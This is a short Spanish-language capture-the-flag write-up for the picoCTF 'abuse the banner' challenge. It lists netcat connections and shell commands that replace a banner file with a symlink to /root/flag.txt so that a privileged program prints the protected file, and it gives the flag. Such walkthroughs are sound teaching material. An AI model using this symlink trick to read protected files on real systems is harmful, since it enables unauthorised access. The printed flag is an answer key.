
**Reto:**
-Estropear un archivo con permisos para acceder a un archivo y obtener la bandera.

**Descripción:**
-Can you abuse the banner?
-The server has been leaking some crucial information on `tethys.picoctf.net 62748`. Use the leaked information to get to the server.
To connect to the running application use `nc tethys.picoctf.net 63109`. From the above information abuse the machine and find the flag in the /root directory.

**Solución:**
Entrar a la conexión, sustituir el archivo usado en el programa con un symlink hacia el archivo protegido y ejecutar el programa para obtener la bandera.
-Ingresar a la conexión con información filtrada para obtener la contraseña.
```
$ nc tethys.picoctf.net 62748
```
-Ingresar a la segunda conexión.
```
$ nc tethys.picoctf.net 63109
```
-En el programa de ingreso a la conexión, ingresar la contraseña y responder a las preguntas que hace el programa.
-Una vez dentro de la instancia, borrar el archivo 'banner'.
```
$ rm banner
```
-Crear un Symlink hacia el archivo 'flag.txt' en la carpeta root.
```
$ ln -s /root/flag.txt banner
```
-Salir de la instancia con exit.
```
$ exit
```
-Al salir volverá a ejecutarse el programa, donde el baneer será sustituido por la bandera.

El resultado es: **picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}**.

**Notas adicionales:**
-Un Symlink es un archivo que esta ligado a otro archivo.
-Existen enlaces duros y enlaces sueves.

**Referencias:**
https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/